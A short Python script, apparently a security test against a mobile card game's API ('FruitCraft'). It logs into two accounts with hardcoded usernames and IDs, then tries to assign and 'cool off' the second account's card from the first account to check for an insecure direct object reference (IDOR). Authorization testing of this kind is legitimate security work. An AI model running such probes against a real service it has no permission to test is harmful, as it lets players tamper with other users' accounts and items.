import sys, os
import json
import time
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "api")))
from fruitcraft_client import FruitClient

def main():
    print("Testing IDOR on Cards Assignment...")
    c1 = FruitClient()
    s1, d1 = c1.login("fact11439memory24", "android_vuln_t1")
    if not s1: return
    
    c2 = FruitClient()
    s2, d2 = c2.login("skirt11437fire14", "android_vuln_t2")
    if not s2: return
    
    c1_cards = d1.get("data", {}).get("cards", [])
    c2_cards = d2.get("data", {}).get("cards", [])

    if len(c2_cards) > 0:
        c2_target = c2_cards[0]["id"]
        print(f"\n[+] T1 Trying to assign T2s card ({c2_target}) to Mine")
        res = c1.post("/cards/assign", {"type": 1001, "cards": json.dumps([c2_target])})
        print("IDOR Assign:", res)
        time.sleep(2)

        print(f"\n[+] T1 Trying to cooloff T2s card ({c2_target})")
        res = c1.post("/cards/cooloff", {"card_id": c2_target})
        print("IDOR Cooloff:", res)

if __name__ == "__main__":
    main()
